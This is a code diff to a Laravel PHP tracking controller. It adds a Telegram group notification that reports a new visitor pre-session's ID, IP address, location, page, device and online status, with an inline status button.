@@ -2,17 +2,21 @@
 
 namespace App\Http\Controllers;
 
+use App\DTOs\TelegramMessageDTO;
 use App\Http\Requests\CreatePreSessionRequest;
 use App\Http\Requests\UpdateOnlineStatusRequest;
 use App\Models\PreSession;
 use App\Services\PreSessionService;
+use App\Services\TelegramService;
 use Illuminate\Http\JsonResponse;
 use Illuminate\Http\Request;
+use SergiX44\Nutgram\Telegram\Types\Keyboard\InlineKeyboardButton;
 
 class TrackingController extends Controller
 {
     public function __construct(
-        private PreSessionService $preSessionService
+        private PreSessionService $preSessionService,
+        private TelegramService $telegramService,
     ) {}
     
     /**
@@ -41,6 +45,46 @@ class TrackingController extends Controller
             $request->input('page_name', 'Unknown'),
             $request->input('page_url')
         );
+
+        $groupChatId = $this->telegramService->getGroupChatId();
+        if ($groupChatId) {
+            $status = $preSession->isCurrentlyOnline() ? '🟢 Онлайн' : '🔴 Оффлайн';
+            $country = trim(($preSession->country_name ?? '') . ' ' . ($preSession->city ?? ''));
+            $country = $country !== '' ? $country : '-';
+            $page = $preSession->page_name ?? '-';
+            $url = $preSession->page_url ?? '-';
+            $device = $preSession->device_type ?? '-';
+
+            $text = implode("\n", [
+                '🛰 <b>Pre-session зашла</b>',
+                '',
+                "🆔 <code>{$preSession->id}</code>",
+                "🌐 IP: <code>{$preSession->ip_address}</code>",
+                "🌍 {$country}",
+                "📄 {$page}",
+                "📱 {$device}",
+                "{$status}",
+                '',
+                "🔗 <code>{$url}</code>",
+            ]);
+
+            $keyboard = [
+                [
+                    InlineKeyboardButton::make(
+                        text: '🟢 Онлайн',
+                        callback_data: "presession:online:{$preSession->id}",
+                    ),
+                ],
+            ];
+
+            $dto = TelegramMessageDTO::create(
+                chatId: $groupChatId,
+                text: $text,
+                keyboard: $keyboard,
+            );
+
+            $this->telegramService->sendMessage($dto);
+        }
         
         return response()->json([
             'success' => true,
